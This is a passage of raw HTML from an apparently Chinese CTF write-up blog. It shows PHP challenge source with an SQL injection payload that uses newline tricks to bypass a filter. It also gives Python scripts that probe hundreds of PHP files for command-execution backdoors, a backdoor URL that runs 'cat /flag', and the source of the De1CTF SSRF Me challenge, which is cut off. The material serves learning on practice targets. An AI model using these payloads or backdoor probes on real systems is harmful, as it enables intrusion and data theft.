class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	output(<span class="string">"&lt;img src='black-fedora.jpg'&gt;"</span>,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href='logout.php'&gt;哎呦不错哦，再来一次。&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    output(<span class="string">"&lt;img src='white-hat.jpg'&gt;"</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href='login.php'&gt;哥想知道自己的真正实力!&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($content,$count)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$count;$i++)&#123;</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'black_hat'</span>) <span class="keyword">or</span> header(<span class="string">'Location: route.php?act=login'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"common.php"</span>;</span><br><span class="line">$connect=mysql_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"there is no ctf!"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"hats"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"there is no hats!"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"name"</span>]))&#123;</span><br><span class="line">  $name = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, trim(waf($_POST[<span class="string">"name"</span>])));</span><br><span class="line">  <span class="keyword">if</span> (strlen($name) &gt; <span class="number">11</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;alert('name too long')&lt;/script&gt;"</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $sql = <span class="string">"select count(*) from t_info where username = '$name' or nickname = '$name'"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="number">0</span>])&#123;</span><br><span class="line">      $_SESSION[<span class="string">'hat'</span>] = <span class="string">'black'</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'good job'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$_SESSION[<span class="string">'hat'</span>] = <span class="string">'green'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>common.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">2</span>);</span><br><span class="line">session_start();</span><br><span class="line">$connect = mysql_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error 1"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"hats"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error 2"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span><span class="params">($array)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($array <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_array($value))&#123;</span><br><span class="line">            !get_magic_quotes_gpc() &amp;&amp; $value=addslashes($value);</span><br><span class="line">            waf($value);</span><br><span class="line">            $array[$key]=$value;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $sid = $_COOKIE[<span class="string">"sid"</span>];</span><br><span class="line">    $data = explode(<span class="string">"|"</span>,$sid);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="number">0</span>] &amp;&amp; $data[<span class="number">1</span>] &amp;&amp; $data[<span class="number">1</span>] == encode($data[<span class="number">0</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $data[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $key = sha1(<span class="string">"Fuck_you_man"</span>);</span><br><span class="line">    <span class="keyword">return</span> md5($key.$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_login</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    $data = encode($name);</span><br><span class="line">    setcookie(<span class="string">"sid"</span>,<span class="string">"$name|$data"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在login.php中发现SQL语句为<code>select count(*) from t_info where username = &#39;$name&#39; or nickname = &#39;$name&#39;</code>,但是传入的name经过了waf函数,过滤了常见的union、select、from</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在index.php中发现，当$_SESSION[‘hat’]不等于green时便会输出flag，</p>
<p>接着看到login.php中，执行SQL查询语句，如果查询结果不为空，那么就<code>$_SESSION[&#39;hat&#39;] = &#39;black&#39;</code>于是构造SQL语句，playload如下：</p>
<blockquote>
<p>or%0a1# ‘</p>
</blockquote>
<p>拼接到SQL语句为：</p>
<blockquote>
<p>select count(*) from t_info where username = ‘or 1#’ or nickname =<br>‘or 1#’</p>
</blockquote>
<p>这里使用%0a的方法进行Http分割注入，当%0a在mysql中执行的时候，是换行，也就是这个效果：</p>
<p><img src="/2020/04/19/CTFstudy/798725717.png" alt="7.png"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-web五</title>
    <url>/2020/05/16/BUU-web5/</url>
    <content><![CDATA[<p><strong>BUU-web五</strong></p>
<p><strong>[强网杯2019]高明的客</strong><br>知识点：python脚本编写</p>
<p><strong>[De1CTF 2019]SSRF Me</strong><br>知识点：python代码审计</p>
<p><strong>[RoarCTF 2019]Easy Java</strong><br>知识点：WEB-INF/web.xml泄露</p>
<p><strong>[SUCTF 2019]Pythonginx</strong><br>知识点：python代码审计</p>
<p><strong>[ASIS 2019]Unicom shop</strong><br>知识点：Unicode</p>
<p><strong>[SWPU2019]Webl</strong><br>知识点：无列名注入</p>
<p><strong>[CISCN 2019 ]Love Math</strong><br>知识点：函数回转</p>
<p><strong>[BJDCTF2020]The mysteryofip</strong><br>知识点：xxf头处smarty模板注入payload</p>
<p><strong>[BJDCTF2020]Cookie is so stable</strong><br>知识点：Twig模板注入</p>
<p><strong>[GWCTF 2019]枯燥的抽奖</strong><br>知识点：php伪随机数漏洞</p>
<p><strong>[V&amp;N2020公开赛]HappyCTFd</strong><br>知识点：逻辑漏洞</p>
<p><strong>[极客大挑战2019]RCE ME</strong><br>知识点：绕过disable_function</p>
<p><strong>[SUCTF 2019]EasyWeb</strong><br>知识点：exif_imagetype()绕过、open_basedir绕过、异或绕过正则、使用python上传文件</p>
<p><strong>[GYCTF2020]FlaskApp</strong><br>知识点：模板注入，读取PIN码拿shell</p>
<p><strong>[HITCON 2017]SSRFme</strong><br>知识点：GET的命令执行漏洞</p>
<a id="more"></a>

<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p><img src="/2020/05/16/BUU-web5/1589348343688.png" alt="1589348343688"></p>
<p>将网站源码下载下来，发现有很多PHP文件<br><img src="/2020/05/16/BUU-web5/1589348680619.png" alt="1589348680619"></p>
<p>通过全局搜索可以发现许多后门，但是很多都不能利用<br><img src="/2020/05/16/BUU-web5/1589348733665.png" alt="1589348733665"></p>
<p>这里需要写个脚本批量扫描一 _GET 和 _POST，通过传入一些命令看其是否执行，例如echo 123456；<br>由于要执行命令，所以要将文件部署在本地PHP环境中</p>
<h2 id="普通脚本"><a href="#普通脚本" class="headerlink" title="普通脚本"></a>普通脚本</h2><p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">'D:/phpstudy_pro/wamp64/www/src/'</span>)    <span class="comment">#获取路径下的所有文件</span></span><br><span class="line">reg = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)   <span class="comment">#设置正则</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                <span class="comment">#从第一个文件开始</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1/src/"</span> + i</span><br><span class="line">    f = open(<span class="string">"D:/phpstudy_pro/wamp64/www/src/"</span>+i)        <span class="comment">#打开这个文件</span></span><br><span class="line">    data = f.read()           <span class="comment">#读取文件内容</span></span><br><span class="line">    f.close()                 <span class="comment">#关闭文件</span></span><br><span class="line">    result = reg.findall(data)  <span class="comment">#从文件中找到GET请求</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> result:           <span class="comment">#从第一个GET参数开始</span></span><br><span class="line">        payload = url + <span class="string">"?"</span> + j + <span class="string">"=echo 123456;"</span>   <span class="comment">##尝试请求次路径，并执行命令</span></span><br><span class="line">        print(payload)</span><br><span class="line">        html = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"123456"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            print(<span class="string">"成功发现后门："</span>+payload)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这个跑的十分的慢<br><img src="/2020/05/16/BUU-web5/1589364526094.png" alt="1589364526094"></p>
<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>使用多线程写将快得多，这里也学习一下别人的脚本，学习一下多线程顺便提高一下自己的编程能力</p>
<p>脚本涉及的一些函数</p>
<blockquote>
<ol>
<li><p><strong>time相关</strong></p>
<blockquote>
<p><strong>1.time.asctime()函数</strong><br>Python time asctime() 函数接受时间元组并返回一个可读的形式为”Tue Dec 11 18:07:14 2008”（2008年12月11日 周二18时07分14秒）的24个字符的字符串。<br>示例:</p>
</blockquote>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(time.asctime())</span><br><span class="line"><span class="comment"># Tue Apr 14 22:42:08 2020</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>2.time.localtime()函数</strong><br>描述：<br>Python time localtime() 函数类似gmtime()，作用是格式化时间戳为本地的时间。 如果sec参数未输入，则以当前时间为转换标准。 DST (Daylight Savings Time) flag (-1, 0 or 1) 是否是夏令时。 示例：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(time.localtime())</span><br><span class="line"><span class="comment"># time.struct_time(tm_year=2020, tm_mon=4, tm_mday=14, tm_hour=22, tm_min=37, tm_sec=13, tm_wday=1, tm_yday=105, tm_isdst=0)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>3.time.time()函数</strong><br>描述：<br>Python time time() 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(time.time())</span><br><span class="line"><span class="comment"># 1586875436.7926576</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p><strong>线程</strong></p>
</li>
<li><p><strong>threading.Thread()函数基本语法</strong></p>
</li>
</ol>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">mthread = threading.<span class="constructor">Thread(<span class="params">target</span>=<span class="params">function_name</span>, <span class="params">args</span>=(<span class="params">function_parameter1</span>, <span class="params">function_parameterN</span>)</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>threading.Semaphore()函数</strong></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">学习博客：https://blog.csdn.net/a349458532/article/details/<span class="number">51589460</span></span><br><span class="line">线程的概念:</span><br><span class="line">线程，有时被称为轻量级进程(Lightweight Process，LWP），是程序执行流的最小单元。一个标准的线程由线程ID，当前指令指针(PC），寄存器集合和堆栈组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。</span><br><span class="line"></span><br><span class="line">                                                                       <span class="number">1.</span> 基本介绍</span><br><span class="line">Semaphore 在内部管理着一个计数器。调用 acquire() 会使这个计数器 <span class="number">-1</span>，release() 则是+<span class="number">1.</span>计数器的值永远不会小于 <span class="number">0</span>，当计数器到 <span class="number">0</span> 时，再调用 acquire() 就会阻塞，直到其他线程来调用release()</span><br><span class="line"></span><br><span class="line">                                                                       <span class="number">2.</span> acquire(blocking=<span class="literal">True</span>,timeout=<span class="literal">None</span>)</span><br><span class="line">本方法用于获取 Semaphore</span><br><span class="line">当使用默认参数调用本方法时：如果内部计数器的值大于零，将之减一，并返回；如果等于零，则阻塞，并等待其他线程调用 release() 方法以使计数器为正。这个过程有严格的互锁机制控制，以保证如果有多条线程正在等待解锁，release() 调用只会唤醒其中一条线程。唤醒哪一条是随机的。本方法返回 <span class="literal">True</span>，或无限阻塞</span><br><span class="line">如果 blocking=<span class="literal">False</span>，则不阻塞，但若获取失败的话，返回 <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                                                                       <span class="number">3.</span> release()</span><br><span class="line">释放 Semaphore，给内部计数器 +<span class="number">1</span>，可以唤醒处于等待状态的线程</span><br><span class="line">脚本中的 threading.Semaphore(<span class="number">100</span>) 是指同时最多有一百个线程运行</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>os.chdir()</strong></li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">描述:</span><br><span class="line"><span class="selector-tag">os</span><span class="selector-class">.chdir</span>() 方法用于改变当前工作目录到指定的路径。</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>os.listdir()</strong></li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">os</span><span class="selector-class">.listdir</span>() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>基本思路：</p>
<blockquote>
<p>依次打开文件，匹配里面所有的$_GET[]和$_POST，然后通过传入命令<code>echo 123456;</code>在返回的页<br>面中匹配123456来判断是否执行</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先导入需要的模块</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading    <span class="comment">#设置多线程</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：'</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">      <span class="comment">#开始时间：Wed May 13 20:32:17 2020</span></span><br><span class="line">MaxThread = threading.Semaphore(<span class="number">100</span>)    <span class="comment">#设置最大线程数</span></span><br><span class="line">FilePath = <span class="string">r"D:\\phpstudy_pro\\wamp64\\www\\src"</span></span><br><span class="line">os.chdir(FilePath)      <span class="comment">#改变当前路径到指定路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>   <span class="comment">#设置重连次数，防止线程数过高导致断开连接</span></span><br><span class="line">files = os.listdir(FilePath)    <span class="comment">#返回指定的文件夹包含的文件或文件夹的名字的列表</span></span><br><span class="line"><span class="comment">#print(files)       #['A00UTldNShN.php', ......, 'a0flV_jlrc1.php']</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>      <span class="comment">#设置连接活跃状态为false</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span>      <span class="comment">#设置函数表示来执files当中一个文件</span></span><br><span class="line">    tt = time.time()</span><br><span class="line">    MaxThread.acquire()     <span class="comment">#获取 Semaphore</span></span><br><span class="line">    print(<span class="string">'正在打开文件：  '</span>+file+<span class="string">'   时间： '</span>+time.asctime(time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>,f.read()))</span><br><span class="line">        posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>,f.read()))</span><br><span class="line">    data = &#123;&#125;       <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;     <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo '123456';"</span>    <span class="comment">#设置好get和post传参</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo '123456';"</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1/src/"</span>+file</span><br><span class="line">    req = session.post(url,data = data,params = params)     <span class="comment">#发送所有的get和post请求</span></span><br><span class="line">    req.close()     <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'123456'</span> <span class="keyword">in</span> content:     <span class="comment">#检查是否执行命令，如果执行，筛选出具体参数</span></span><br><span class="line">        flag = <span class="number">0</span>    <span class="comment">#通过flag的值来判断是get还是post</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?'</span>+a+<span class="string">"=echo '123456';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()             <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'123456'</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url = url ,data = &#123;b:<span class="string">"echo '123456';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()         <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'123456'</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'&lt;=================================================================&gt;'</span>)</span><br><span class="line">        print(<span class="string">'发现含有后门的文件：'</span>+file+<span class="string">"   传入的参数为："</span>+param+<span class="string">"=echo '123456';"</span>)</span><br><span class="line">        print(<span class="string">'程序运行结束，结束时间为：'</span>+time.asctime(time.localtime(time.time())))</span><br><span class="line">        print(<span class="string">'程序总共耗时：'</span>+time.asctime(time.localtime(time.time()-tt)))</span><br><span class="line">        print(<span class="string">'&lt;=================================================================&gt;'</span>)</span><br><span class="line">        exit()</span><br><span class="line">    MaxThread.release()         <span class="comment">#释放 Semaphore</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:     <span class="comment">#加入多线程</span></span><br><span class="line">    t = threading.Thread(target=get_content,args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589377704993.png" alt="1589377704993"></p>
<p>这个脚本思路还是很清晰的，不过多线程还是有点不熟悉，以后遇到要脚本的题还是尽量自己写一遍<br><a href="https://blog.csdn.net/a3320315/article/details/102945940?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">参考脚本</a></p>
<p>最后发现后门<code>/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code>得到flag<br><img src="/2020/05/16/BUU-web5/1589358734581.png" alt="1589358734581"></p>
<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 